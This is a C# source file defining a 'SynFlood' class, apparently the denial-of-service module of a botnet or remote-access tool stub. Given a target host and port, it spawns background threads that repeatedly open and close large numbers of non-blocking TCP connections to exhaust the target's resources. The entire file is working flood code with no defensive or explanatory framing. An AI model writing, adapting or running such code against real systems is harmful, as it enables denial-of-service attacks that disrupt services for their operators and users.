using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Stub
{
    internal class SynFlood
    {
        private static volatile bool _running;
        private static IPEndPoint ipEo;
        private static Thread[] threads;

        public static string Host;
        public static int Port;
        public static int SynSockets;
        public static int Threads;

        public static void StartSynFlood()
        {
            try
            {
                ipEo = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
            }
            catch
            {
                ipEo = new IPEndPoint(IPAddress.Parse(Host), Port);
            }

            _running = true;
            threads = new Thread[Threads];

            for (int i = 0; i < Threads; i++)
            {
                threads[i] = new Thread(() => Send(ipEo, SynSockets));
                threads[i].IsBackground = true;
                threads[i].Start();
            }
        }

        public static void StopSynFlood()
        {
            _running = false;
        }

        private static void Send(IPEndPoint target, int socketCount)
        {
            while (_running)
            {
                Socket[] sockets = new Socket[socketCount];
                try
                {
                    for (int i = 0; i < socketCount; i++)
                    {
                        sockets[i] = new Socket(target.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        sockets[i].Blocking = false;
                        sockets[i].BeginConnect(target, ar => { }, sockets[i]);
                    }

                    Thread.Sleep(100);

                    for (int i = 0; i < socketCount; i++)
                    {
                        try
                        {
                            if (sockets[i].Connected)
                                sockets[i].Disconnect(false);
                            sockets[i].Close();
                        }
                        catch { }
                        sockets[i] = null;
                    }
                }
                catch
                {
                    for (int i = 0; i < socketCount; i++)
                    {
                        try
                        {
                            if (sockets[i] != null)
                            {
                                if (sockets[i].Connected)
                                    sockets[i].Disconnect(false);
                                sockets[i].Close();
                            }
                        }
                        catch { }
                    }
                }
            }
        }
    }
}
